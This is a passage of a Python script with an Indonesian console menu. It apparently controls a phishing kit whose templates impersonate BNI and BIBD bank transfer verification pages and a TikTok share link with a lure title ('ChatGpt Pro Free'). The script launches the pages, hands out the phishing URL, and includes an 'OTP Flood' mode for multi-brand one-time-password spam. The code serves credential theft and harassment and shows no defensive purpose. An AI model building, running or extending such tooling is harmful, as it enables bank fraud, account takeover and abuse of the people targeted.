        if idx < len(tmpl_keys):
            key = tmpl_keys[idx]
            if key != eng.current_template:
                eng.stop_all()
                eng.current_template = key

                # Prompt custom title for TikTok template
                if key == "tiktok":
                    print()
                    print(f"  {C.CYN}Template TikTok - Masukkan Title URL kamu{C.RST}")
                    print(f"  {C.SLATE}Contoh: TikTok - ChatGpt Pro Free{C.RST}")
                    print(f"  {C.SLATE}atau biarkan kosong untuk default: {TEMPLATES['tiktok']['title']}{C.RST}")
                    print()
                    print(f"{C.CYN}  Title URL: {C.RST}", end="")
                    custom = input().strip()
                    if custom:
                        eng.custom_title = custom
                        step(f"Custom title: {custom}")
                    else:
                        eng.custom_title = TEMPLATES['tiktok']['title']
                        step("Menggunakan default title")
                    time.sleep(0.5)
                else:
                    eng.custom_title = None

                print(f"\n{C.GRN}  Template diubah ke: {TEMPLATES[key]['name']}{C.RST}")
                time.sleep(1)
                eng.start_all()
            else:
                print(f"{C.YLW}  Template sudah aktif!{C.RST}")
        else:
            print(f"{C.YLW}  Pilihan tidak valid!{C.RST}")
    else:
        print(f"{C.YLW}  Pilihan tidak valid!{C.RST}")


def _run_otp_flood():
    """Run OTP Flood interactive session."""
    try:
        from modules.otp_flood.ui import otp_flood_menu
        otp_flood_menu()
        return True
    except ImportError as e:
        print(f"{C.RED}  OTP Flood module tidak ditemukan: {e}{C.RST}")
        print(f"{C.YLW}  Pastikan folder modules/otp_flood/ ada.{C.RST}")
        return False
    except Exception as e:
        print(f"{C.RED}  OTP Flood error: {e}{C.RST}")
        return False


def main():
    if os.name == "nt": os.system("")
    eng = Engine()
    banner()

    print(f"\n{C.TEAL}  Pilih template:{C.RST}")
    print(f"  {C.TEAL}[1]{C.RST}  BNI  {C.SLATE}Bank Transfer Verification{C.RST}")
    print(f"  {C.TEAL}[2]{C.RST}  TikTok  {C.SLATE}Video Share Link{C.RST}")
    print(f"  {C.TEAL}[3]{C.RST}  BIBD  {C.SLATE}Brunei Darussalam{C.RST}")
    print(f"  {C.TEAL}[4]{C.RST}  OTP Flood  {C.SLATE}Multi-Brand Spam{C.RST}")
    print()

    tmpl_keys = list(TEMPLATES.keys())

    while True:
        try:
            print(f"{C.CYN}  Pilih template (1-{len(tmpl_keys)}): {C.RST}", end="")
            ch = input().strip()
            if ch in [str(i) for i in range(1, len(tmpl_keys)+1)]:
                idx = int(ch) - 1
                eng.current_template = tmpl_keys[idx]
                step(f"Template: {TEMPLATES[eng.current_template]['name']}")
                time.sleep(0.5)
                break
            else:
                print(f"{C.YLW}  Masukkan 1-{len(tmpl_keys)}!{C.RST}")
        except (KeyboardInterrupt, EOFError):
            print(f"\n{C.CYN}Sampai jumpa!{C.RST}")
            sys.exit(0)

    # Prompt custom title for TikTok template
    if eng.current_template == "tiktok":
        print()
        print(f"  {C.CYN}Template TikTok - Masukkan Title URL kamu{C.RST}")
        print(f"  {C.SLATE}Contoh: TikTok - ChatGpt Pro Free{C.RST}")
        print(f"  {C.SLATE}atau biarkan kosong untuk default: {TEMPLATES['tiktok']['title']}{C.RST}")
        print()
        print(f"{C.CYN}  Title URL: {C.RST}", end="")
        custom = input().strip()
        if custom:
            eng.custom_title = custom
            step(f"Custom title: {custom}")
        else:
            eng.custom_title = TEMPLATES['tiktok']['title']
            step(f"Menggunakan default title")
        time.sleep(0.5)

    # If OTP Flood mode, run directly (no build/server needed)
    if TEMPLATES[eng.current_template].get("is_otp_mode"):
        _run_otp_flood()
        # After flood menu returns, go back to template selection
        main_loop(eng)
        return

    eng.start_all()
    main_loop(eng)


def main_loop(eng):
    while True:
        try:
            menu(eng.current_template)
            is_otp = TEMPLATES[eng.current_template].get("is_otp_mode", False)
            if is_otp:
                print(f"{C.CYN}  Pilih menu (1-3): {C.RST}", end="")
            else:
                print(f"{C.CYN}  Pilih menu (1-6): {C.RST}", end="")
            ch = input().strip()

            if is_otp:
                if ch == "1":
                    _run_otp_flood()
                elif ch == "2":
                    main()
                    return
                elif ch == "3":
                    print(f"  {C.CYN}Sampai jumpa!{C.RST}\n")
                    sys.exit(0)
                else:
                    print(f"  {C.YLW}Masukkan 1-3{C.RST}")
            else:
                if ch == "1": eng.start_all()
                elif ch == "2": eng.stop_all()
                elif ch == "3": eng.show_status()
                elif ch == "4":
                    url = eng.url
                    if not url:
                        eng.show_status()
                        url = eng.url
                    if url:
                        print(f"\n  {C.B}{C.CYN}URL:{C.RST}")
                        print(f"  {C.BG_B}{C.WHT}  {url}  {C.RST}\n")
                        try:
                            subprocess.run("clip", input=url.encode("utf-8"), check=True)
                            print(f"  {C.GRN}Disalin ke clipboard!{C.RST}\n")
                        except: print(f"  {C.DIM}(Salin manual){C.RST}\n")
                    else:
                        print(f"\n  {C.YLW}Tidak ada URL. Tekan [1] untuk memulai.{C.RST}\n")
                elif ch == "5":
                    choose_template(eng)
                elif ch == "6":
                    eng.stop_all()
                    print(f"  {C.CYN}Sampai jumpa!{C.RST}\n")
                    sys.exit(0)
                else: print(f"  {C.YLW}Masukkan 1-6{C.RST}")
        except KeyboardInterrupt:
            print(); eng.stop_all()
            print(f"  {C.CYN}Sampai jumpa!{C.RST}\n"); sys.exit(0)
        except EOFError: eng.stop_all(); sys.exit(0)


if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{C.CYN}Keluar...{C.RST}")
    except Exception as e:
        print(f"\n{C.RED}Error: {e}{C.RST}"); sys.exit(1)